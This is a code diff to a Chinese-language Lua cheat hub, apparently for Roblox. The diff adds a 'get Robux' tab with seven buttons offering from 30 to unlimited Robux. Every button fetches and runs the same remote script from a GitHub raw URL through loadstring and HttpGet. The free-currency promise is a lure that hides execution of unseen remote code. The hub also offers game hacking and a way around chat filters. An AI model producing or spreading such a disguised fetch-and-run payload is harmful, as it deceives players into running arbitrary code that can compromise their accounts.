@@ -40,6 +40,7 @@ local main = window:Tab("主要的", "17493876383")--1
 local main9178 = window:Tab("黑客入侵无需后门", "17493876383")--1
 local amusement = window:Tab("娱乐", "17493876383")--1
 local SettingsTab = window:Tab("设置", "6034509993")--2
+local SettingsTab91 = window:Tab("获取罗宝", "6034509993")--2
 local CNScript = window:Tab("脚本中心", "6031302918")--3
 local FEScript = window:Tab("FE", "6022668955")--4
 local buildaship = window:Tab("造船寻宝", "6031097229")--5
@@ -106,6 +107,7 @@ local chat = amusement:section("破解违禁词方法", false)
 local SETUP = SettingsTab:section("游戏设置", false)
 local SETU = SettingsTab:section("画质设置", false)
 local set = SettingsTab:section("UI设置和自定义",false)
+local sets = SettingsTab91:section("获得r币",false)
 local CNA = CNScript:section("空云制作", false)
 local CNS = CNScript:section("其他国外脚本", false)
 local CN = CNScript:section("其他国内脚本", false)
@@ -1816,6 +1818,49 @@ set:Toggle("移除UI辉光", "", false, function(state)
         set:Keybind("切换用户界面", Enum.KeyCode.Home, function(Value)
             ToggleUILib()
         end)
+        
+sets:Button(
+    "30r币",
+    function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/xiaoSB33/M416/refs/heads/main/Wind/sb/c00kidd+1x1x1.LUA",true))()
+    end
+)
+sets:Button(
+    "60r币",
+    function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/xiaoSB33/M416/refs/heads/main/Wind/sb/c00kidd+1x1x1.LUA",true))()
+    end
+)
+sets:Button(
+    "100r币",
+    function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/xiaoSB33/M416/refs/heads/main/Wind/sb/c00kidd+1x1x1.LUA",true))()
+    end
+)
+sets:Button(
+    "500r币",
+    function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/xiaoSB33/M416/refs/heads/main/Wind/sb/c00kidd+1x1x1.LUA",true))()
+    end
+)
+sets:Button(
+    "1000r币",
+    function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/xiaoSB33/M416/refs/heads/main/Wind/sb/c00kidd+1x1x1.LUA",true))()
+    end
+)
+sets:Button(
+    "5000r币",
+    function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/xiaoSB33/M416/refs/heads/main/Wind/sb/c00kidd+1x1x1.LUA",true))()
+    end
+)
+sets:Button(
+    "无限r币",
+    function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/xiaoSB33/M416/refs/heads/main/Wind/sb/c00kidd+1x1x1.LUA",true))()
+    end
+)
 
 CNA:Label("不知道哪个脚本，请联系QQ3126295205")
 CNS:Button(
